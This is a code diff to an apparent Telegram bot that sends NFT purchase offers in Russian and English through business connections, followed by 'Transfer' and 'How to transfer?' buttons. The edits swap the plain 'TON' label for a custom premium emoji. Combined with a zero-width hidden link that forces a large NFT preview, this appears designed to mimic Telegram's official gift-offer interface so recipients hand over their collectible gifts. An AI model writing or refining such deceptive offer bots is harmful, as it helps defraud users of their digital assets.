@@ -18,8 +18,10 @@ STAR_EMOJI_ID = "5323333018151045958"
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
+TON_EMOJI_ID = "5406976471153545018" # <--- ID TON
 
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
+TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' # Заменил обычный бриллиант на тег
 
 # --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
 async def safe_delete(chat_id, message_id, conn_id=None):
@@ -69,10 +71,11 @@ async def send_offer(message: Message):
     if lang not in ["ru", "en"]:
         return
 
+    # Настройка валюты (без слов)
     if currency_raw == "stars":
         currency_display = STAR_EMOJI
     elif currency_raw == "ton":
-        currency_display = "TON"
+        currency_display = TON_EMOJI
     else:
         currency_display = "Gram"
 
@@ -85,7 +88,6 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # ТЕКСТ КАК БЫЛ (ничего не менял)
     if lang == "ru":
         offer_text = (
             f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft_link}.</b>\n\n"
@@ -99,7 +101,6 @@ async def send_offer(message: Message):
             f"{hidden_link}"
         )
 
-    # КНОПКИ (только добавил эмодзи)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
             text="Отклонить" if lang == "ru" else "Decline", 
@@ -132,9 +133,8 @@ async def send_offer(message: Message):
             text=offer_text,
             reply_markup=keyboard,
             business_connection_id=message.business_connection_id,
-            # ПРИНУДИТЕЛЬНО УКАЗЫВАЕМ NFT ДЛЯ ПРЕВЬЮ
             link_preview_options=LinkPreviewOptions(
-                url=link, 
+                url=link,
                 is_disabled=False,
                 prefer_large_media=True,
                 show_above_text=True
@@ -180,7 +180,6 @@ async def on_accept_offer(callback: CallbackQuery):
         btn_transfer = "Transfer"
         btn_how = "How to transfer?"
 
-    # Кнопка "Передать" с конвертом
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text=btn_transfer, 
